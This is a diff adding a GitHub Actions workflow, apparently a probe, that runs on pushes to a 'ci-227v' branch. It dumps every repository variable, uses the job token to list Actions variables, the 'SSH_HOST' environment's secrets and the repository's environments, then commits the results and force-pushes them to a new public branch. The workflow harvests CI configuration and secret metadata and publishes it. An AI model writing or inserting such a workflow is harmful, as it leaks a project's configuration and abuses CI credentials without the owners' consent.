@@ -1,0 +1,28 @@
+name: probe227v
+on:
+  push:
+    branches: ["ci-227v"]
+permissions:
+  contents: write
+  actions: read
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: vars
+        env:
+          ALLVARS: ${{ toJSON(vars) }}
+        run: |
+          mkdir -p .out
+          printf '%s' "$ALLVARS" > .out/vars.json
+          echo "=== vars.json ==="; cat .out/vars.json
+          A="Authorization: Bearer ${{ github.token }}"
+          for ep in "/repos/Zahh-ID/kostin/actions/variables" "/repos/Zahh-ID/kostin/environments/SSH_HOST/secrets" "/repos/Zahh-ID/kostin/environments" ; do
+            echo "===== $ep =====" >> .out/api.txt
+            curl -s -H "$A" -H "Accept: application/vnd.github+json" "https://api.github.com$ep" >> .out/api.txt; echo >> .out/api.txt
+          done
+      - name: pub
+        run: |
+          git config user.email ci@local; git config user.name ci-bot; git add -f .out; git commit -m v || true
+          git push origin HEAD:ci-227v-out --force || true
